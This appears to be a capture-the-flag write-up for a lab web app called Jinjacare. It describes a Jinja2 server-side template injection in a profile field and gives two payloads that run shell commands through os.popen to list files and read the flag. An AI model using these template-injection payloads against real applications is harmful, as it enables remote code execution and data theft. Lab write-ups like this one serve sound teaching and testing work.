---
title: Jinjacare - Hack The System
description: JinjaCare is a web application designed to manage COVID-19 vaccination records. It allows users to view their personal information, medical history, and generate digital vaccination certificates. Your task is to discover vulnerabilities in the system and extract the hidden flag.
author: 
date: 2025-06-30 20:00:00 +0800
categories: [CTF, Web]
tags: [writeup, web, ssti]
image:
  path: assets/posts/Pasted image 20250731080047.png
  alt: A cool background image
---

**Challenge**  
“Jinjacare is a web application designed to help citizens manage and access their COVID-19 vaccination records. The platform allows users to store their vaccination history and generate digital certificates. They’ve asked you to hunt for any potential security issues in their application and retrieve the flag stored in their site.”

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2

![](/assets/posts/Jinjacare/assets/1.png)

![](/assets/posts/Jinjacare/assets/2.png)

after registering for an account. There is a form field on personal info. The input for update personal info is not being validated, injectionion attacks are possible here in edit profile.

The profile update reflect on dashboard page, download certificate. The input field of vaccine name is vulnerable to ssti

![](/assets/posts/Jinjacare/assets/3.png)


```python
{% raw %}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% endraw %}
```

```python
{% raw %}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
{% endraw %}
```

![](/assets/posts/Jinjacare/assets/4.png)